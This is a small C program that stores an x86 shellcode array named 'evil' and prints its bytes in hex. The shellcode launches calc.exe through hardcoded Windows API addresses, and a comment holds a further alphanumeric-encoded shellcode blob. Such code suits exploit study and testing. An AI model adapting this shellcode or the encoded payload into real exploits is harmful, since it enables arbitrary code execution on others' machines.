#include <stdio.h> // printf(), fprintf(), stderr
#include <stdlib.h> // exit(), EXIT_SUCCESS, EXIT_FAILURE, srand(), rand()
#include <string.h> // _stricmp(), strcasecmp(), strstr()

unsigned char evil[] =   {0xeb,0x16,0x5b,0x6a,0x01,0x58,0x53,0xbb,0x0d,0x25,0x86,0x7c,0xff,0xd3,0x31,0xc0   
  
,0x50,0xbb,0x12,0xcb,0x81,0x7c,0xff,0xd3,0xe8,0xe5,0xff,0xff,0xff,0x63,0x61,0x6c   
  
,0x63,0x2e,0x65,0x78,0x65,0x00};
  
/*"/xeb/x16/x5b/x6a/x01/x58/x53/xbb/x0d/x25/x86/x7c/xff/xd3/x31/xc0"   
  
"/x50/xbb/x12/xcb/x81/x7c/xff/xd3/xe8/xe5/xff/xff/xff/x63/x61/x6c"   
  
"/x63/x2e/x65/x78/x65/x00"; */  

//TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIxkVvqKRJ31PXrsOKtMFEk6cL9oKcFQIPPPmkFrHKNaQlYoXSjHIu9oyokOsSu1RLasfNQuPxPegps0A


int main(){
int input;
printf("%s %d\n",evil,sizeof(evil));
for (int k=0;k<sizeof(evil);k++)//evil你自己的shllcode，用的话需修改源码
 {

    input=evil[k];
printf("%x ",input);
}

}
